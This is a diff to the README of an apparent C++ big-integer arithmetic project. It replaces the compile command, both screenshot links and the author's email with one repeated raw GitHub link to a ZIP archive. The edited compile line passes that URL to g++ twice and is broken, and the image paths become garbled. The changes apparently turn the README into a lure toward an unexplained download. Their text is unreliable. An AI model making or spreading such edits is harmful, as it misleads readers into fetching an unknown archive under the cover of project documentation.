@@ -17,7 +17,7 @@ This project implements a **Big Integer arithmetic library in C++**. It supports
 
 1. **Compile the source files** using a C++ compiler:
    ```bash
-   g++ BigInt.cpp main.cpp -o BigIntApp
+   g++ https://raw.githubusercontent.com/amanverma420/BigIntProject/main/soodle/BigIntProject.zip https://raw.githubusercontent.com/amanverma420/BigIntProject/main/soodle/BigIntProject.zip -o BigIntApp
    ./BigIntApp
    ```
 Run the executable and input large integers to perform operations interactively.
@@ -25,13 +25,13 @@ Run the executable and input large integers to perform operations interactively.
 📸 Screenshots
 ## 📸 Screenshots
 
-![Input](Screenshot%202025-06-23%20190536.png)  
+![Input](Screenshot%202025-06-23%https://raw.githubusercontent.com/amanverma420/BigIntProject/main/soodle/BigIntProject.zip)  
 
 Output :->
 
-![Output](Screenshot%202025-06-23%20190732.png)
+![Output](Screenshot%202025-06-23%https://raw.githubusercontent.com/amanverma420/BigIntProject/main/soodle/BigIntProject.zip)
 
 👤 Author
 Aman Verma
-📧 amanv2225@gmail.com
+📧 https://raw.githubusercontent.com/amanverma420/BigIntProject/main/soodle/BigIntProject.zip
 
